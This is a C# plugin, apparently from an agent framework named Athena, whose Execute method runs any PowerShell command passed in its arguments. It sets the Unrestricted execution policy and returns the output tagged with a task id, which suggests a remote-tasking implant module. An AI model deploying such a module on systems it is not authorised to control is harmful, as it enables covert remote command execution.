using System.Management.Automation;
using System.Text;
using System.Management.Automation.Runspaces;
using Microsoft.PowerShell;
using PluginBase;

namespace Athena
{
    public static class Plugin
    {

        public static ResponseResult Execute(Dictionary<string, object> args)
        {
            bool isSuccess = false;
            string resStr = String.Empty;
            Runspace runspace;

            if (args.ContainsKey("command") && !string.IsNullOrEmpty((string)args["command"]))
            {
                if (Runspace.DefaultRunspace == null)
                {
                    InitialSessionState initialSessionState = InitialSessionState.CreateDefault();
                    initialSessionState.ExecutionPolicy = ExecutionPolicy.Unrestricted;

                    runspace = RunspaceFactory.CreateRunspace(initialSessionState);
                    runspace.Open();
                    Runspace.DefaultRunspace = runspace;
                }
                else
                {
                    runspace = Runspace.DefaultRunspace;
                }


                using (PowerShell ps = PowerShell.Create(runspace))
                {

                    ps.AddScript((string)args["command"]);

                    try
                    {
                        var iAsyncResult = ps.BeginInvoke();
                        iAsyncResult.AsyncWaitHandle.WaitOne();
                        var outputCollection = ps.EndInvoke(iAsyncResult);
                        StringBuilder sb = new StringBuilder();

                        if (outputCollection.Count > 0)
                        {
                            foreach (var x in outputCollection)
                            {
                                if (x != null)
                                {
                                    sb.AppendLine(x.ToString());
                                }
                            }
                            isSuccess = true;
                            resStr = sb.ToString();
                        }
                        else
                        {
                            isSuccess = true;
                            resStr = "no results";
                        }
                    }
                    catch (Exception e)
                    {
                        //problem running script
                        isSuccess = false;
                        resStr = e.Message;
                    }
                }
            }
            else
            {
                isSuccess = false;
                resStr = "Could not find any parameter";
            }

            //return response
            if (!isSuccess)
            {
                return new ResponseResult
                {
                    completed = "true",
                    user_output = resStr,
                    task_id = (string)args["task-id"],
                    status = "error"
                };
            }
            else
            {
                return new ResponseResult
                {
                    completed = "true",
                    user_output = resStr,
                    task_id = (string)args["task-id"],
                };
            }
        }
    }
}